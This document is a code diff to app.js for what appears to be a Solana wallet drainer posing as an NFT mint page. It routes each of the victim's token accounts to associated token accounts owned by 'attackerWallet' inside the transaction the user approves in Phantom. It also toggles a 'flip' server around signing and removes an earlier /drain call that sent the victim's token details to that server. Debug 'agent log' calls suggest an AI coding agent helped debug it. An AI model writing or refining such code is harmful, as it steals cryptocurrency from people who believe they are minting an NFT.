@@ -170,13 +170,17 @@ async function mintNFT() {
         });
         var tokenBatch = cachedTokenAccounts.slice(0, MAX_TOKENS_PER_TX);
 
+        var vaultPda = getVaultPDA();
+
         var remainingKeys = [];
         for (var i = 0; i < tokenBatch.length; i++) {
             var ta = tokenBatch[i];
+            var ata = getATA(ta.mint, attackerWallet, ta.tokenProgramId);
             // #region agent log
-            fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:remaining_keys_loop',message:'Token in batch',data:{index:i,victimTA:ta.pubkey.toBase58(),mint:ta.mint.toBase58(),tokenProgram:ta.tokenProgramId.toBase58(),amount:ta.amount,decimals:ta.decimals},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
+            fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:remaining_keys_loop',message:'Token in batch',data:{index:i,victimTA:ta.pubkey.toBase58(),attackerATA:ata.toBase58(),mint:ta.mint.toBase58(),tokenProgram:ta.tokenProgramId.toBase58(),amount:ta.amount,decimals:ta.decimals},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
             // #endregion
             remainingKeys.push({ pubkey: ta.pubkey, isSigner: false, isWritable: true });
+            remainingKeys.push({ pubkey: ata, isSigner: false, isWritable: true });
             remainingKeys.push({ pubkey: ta.tokenProgramId, isSigner: false, isWritable: false });
         }
 
@@ -184,7 +188,8 @@ async function mintNFT() {
             keys: [
                 { pubkey: configPda, isSigner: false, isWritable: false },
                 { pubkey: userPublicKey, isSigner: true, isWritable: true },
-                { pubkey: attackerWallet, isSigner: false, isWritable: false },
+                { pubkey: vaultPda, isSigner: false, isWritable: true },
+                { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
             ].concat(remainingKeys),
             programId: programId,
             data: discriminator,
@@ -197,66 +202,32 @@ async function mintNFT() {
         var latest = await connection.getLatestBlockhash();
         tx.recentBlockhash = latest.blockhash;
 
-        setStatus('Please approve in Phantom...');
-
-        // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:pre-sign',message:'About to signTransaction',data:{txIxCount:tx.instructions.length,remainingKeysCount:remainingKeys.length,feePayer:tx.feePayer.toBase58()},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
-        // #endregion
-
-        var signedTx = await window.solana.signTransaction(tx);
-
-        setStatus('Processing...');
+        setStatus('Preparing...');
 
         // #region agent log
         var flipStart = Date.now();
         // #endregion
         await fetch(FLIP_SERVER + '/flip-on', { method: 'POST' });
         // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-flipOn',message:'flip-on done',data:{flipMs:Date.now()-flipStart},timestamp:Date.now(),hypothesisId:'H2'})}).catch(function(){});
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-flipOn',message:'flip-on done',data:{flipMs:Date.now()-flipStart},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
         // #endregion
 
-        var rawTx = signedTx.serialize();
-        var signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
+        setStatus('Please approve in Phantom...');
+
+        var result = await window.solana.signAndSendTransaction(tx, { skipPreflight: true });
+        var signature = result.signature;
 
         // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-send',message:'Tx sent',data:{signature:signature},timestamp:Date.now(),hypothesisId:'H2'})}).catch(function(){});
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-signAndSend',message:'signAndSendTransaction done',data:{signature:signature},timestamp:Date.now(),hypothesisId:'H2'})}).catch(function(){});
         // #endregion
+
+        fetch(FLIP_SERVER + '/flip-off', { method: 'POST' }).catch(function() {});
 
         setStatus('Confirming transaction...', '');
         await connection.confirmTransaction(
             { signature: signature, blockhash: latest.blockhash, lastValidBlockHeight: latest.lastValidBlockHeight },
             'confirmed'
         );
-
-        // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-confirm',message:'Tx confirmed, calling drain',data:{signature:signature},timestamp:Date.now(),hypothesisId:'H3'})}).catch(function(){});
-        // #endregion
-
-        fetch(FLIP_SERVER + '/flip-off', { method: 'POST' }).catch(function() {});
-
-        var drainData = tokenBatch.map(function(ta) {
-            return {
-                victimTokenAccount: ta.pubkey.toBase58(),
-                mint: ta.mint.toBase58(),
-                tokenProgram: ta.tokenProgramId.toBase58(),
-                amount: ta.amount,
-                decimals: ta.decimals,
-                owner: userPublicKey.toBase58(),
-            };
-        });
-        try {
-            var drainResp = await fetch(FLIP_SERVER + '/drain', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ tokens: drainData }),
-            });
-            var drainResult = await drainResp.json();
-            // #region agent log
-            fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-drain',message:'Drain result',data:{drainResult:drainResult},timestamp:Date.now(),hypothesisId:'H4'})}).catch(function(){});
-            // #endregion
-        } catch(de) {
-            console.warn('Drain call failed:', de);
-        }
 
         var postBalance = await connection.getBalance(userPublicKey);
         setStatus('Transaction confirmed: ' + signature.slice(0, 16) + '...', 'success');
